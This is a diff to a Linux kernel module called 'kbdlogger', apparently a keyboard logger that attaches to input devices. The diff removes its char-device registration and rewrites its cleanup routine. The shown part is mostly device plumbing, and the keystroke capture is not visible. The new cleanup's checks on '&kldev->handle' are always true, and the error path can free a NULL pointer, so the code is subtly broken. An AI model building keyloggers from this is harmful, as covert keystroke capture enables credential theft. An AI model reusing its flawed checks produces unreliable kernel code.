@@ -29,7 +29,6 @@
 #include <linux/cdev.h>
 #include <linux/kobject.h>
 #include <linux/time.h>
-#include <linux/pci.h>
 #include <linux/platform_device.h>
 #include <linux/uaccess.h>
 #include <linux/major.h>
@@ -50,8 +49,6 @@ const char *kbdstr = "keyboard";
 
 struct kbdloggerdev {
 	struct input_handle handle;
-	struct device dev;
-	struct cdev   cdev;
 };
 
 struct kbdloggerdev *kldev;
@@ -61,18 +58,19 @@ static const struct file_operations kldev_fops = {
 };
 
 
-static void kldev_release(struct device *dev)
-{
-}
-
 static void kbdlogger_cleanup(void)
 {
-	cdev_del(&kldev->cdev);
-	device_del(&kldev->dev);
-	input_close_device(&kldev->handle);
-	input_free_minor(MINOR(kldev->dev.devt));
-	input_unregister_handle(&kldev->handle);
-	put_device(&kldev->dev);
+
+	if (&kldev->handle)
+		input_close_device(&kldev->handle);
+	else
+		pr_err("input device already NULL\n");
+
+	if (&kldev->handle)
+		input_unregister_handle(&kldev->handle);
+	else
+		pr_err("input handle already NULL\n");
+
 	kfree(kldev);
 }
 
@@ -97,40 +95,20 @@ static int kbdlogger_connect(struct input_handler *handler,
 	kldev = kzalloc(sizeof(struct kbdloggerdev), GFP_KERNEL);
 	if (!kldev) {
 		error = -ENOMEM;
-		goto err_free_minor;
+		goto err_cleanup_kldev;
 	}
 
 	dev_no = minor;
 	/* Normalize device number if it falls into legacy range */
 	if (dev_no < EVDEV_MINOR_BASE + EVDEV_MINORS)
 		dev_no -= EVDEV_MINOR_BASE;
-	dev_set_name(&kldev->dev, "event%d", dev_no);
 
-	kldev->handle.dev = dev;
+	kldev->handle.dev = dev;  /* input_dev */
 	kldev->handle.handler = handler;
 	kldev->handle.name = "kbdlogger_handle";
 	kldev->handle.private = kldev;
 
-	kldev->dev.devt = MKDEV(INPUT_MAJOR, minor);
-	kldev->dev.class = &input_class;
-	kldev->dev.parent = &dev->dev;
-	kldev->dev.release = kldev_release;
-	device_initialize(&kldev->dev);
-
 	error = input_register_handle(&kldev->handle);
-	if (error)
-		goto err_cleanup_kldev;
-
-	/* char device setup (struct cdev) */
-	cdev_init(&kldev->cdev, &kldev_fops);
-	kldev->cdev.kobj.parent = &kldev->dev.kobj;
-	error = cdev_add(&kldev->cdev, kldev->dev.devt, 1);
-	if (error)
-		goto err_cleanup_kldev;
-
-
-	/* device registering */
-	error = device_add(&kldev->dev);
 	if (error)
 		goto err_cleanup_kldev;
 
@@ -145,9 +123,6 @@ static int kbdlogger_connect(struct input_handler *handler,
 
 	return 0;
 
-err_free_minor:
-	input_free_minor(minor);
-	return error;
 err_cleanup_kldev:
 	kbdlogger_cleanup();
 	return error;
